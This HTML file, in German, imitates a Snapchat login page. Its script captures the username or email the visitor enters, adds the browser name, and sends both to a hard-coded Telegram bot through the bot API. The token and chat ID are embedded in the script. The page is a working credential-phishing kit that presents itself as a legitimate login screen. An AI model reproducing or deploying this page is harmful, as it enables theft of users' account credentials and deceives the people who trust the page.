<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
</head>
<body>

    <h1>Logge dich bei Snapchat ein</h1>

    <label for="message">Nutzername oder Email</label>
    <input type="text" id="message" placeholder="Nutzername oder Email">
    <button>Stattdessen Handynummer verwenden</button>
    <button onclick="sendMessage()">Weiter</button>
    <button>Neu bei Snapchat? Registrieren</button>

    <script>
        function sendMessage() {
            // Telegram-Bot-API-URL
            var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
            
            // Chat-ID des Empfängers
            var chatId = "709764990";
            
            // Nachricht aus der Textbox holen
            var message = $("#message").val();
            
            // Browsernamen abrufen
            var browserName = getBrowserName();
            
            // Nachricht zusammenstellen
            var fullMessage = "Nachricht: " + message + "\nBrowser: " + browserName;
            
            // Anfrage an die Telegram-Bot-API senden
            $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                // Antwort verarbeiten (hier kannst du auf die Antwort reagieren, wenn du möchtest)
                console.log("Antwort von der Telegram API:", data);
            });
        }

        function getBrowserName() {
            var userAgent = navigator.userAgent;
            var browserName;

            if (userAgent.indexOf("Chrome") != -1) browserName = "Chrome";
            else if (userAgent.indexOf("Safari") != -1) browserName = "Safari";
            else if (userAgent.indexOf("Firefox") != -1) browserName = "Firefox";
            else if (userAgent.indexOf("Edge") != -1) browserName = "Edge";
            else browserName = "Unbekannt";

            return browserName;
        }
    </script>

</body>
</html>
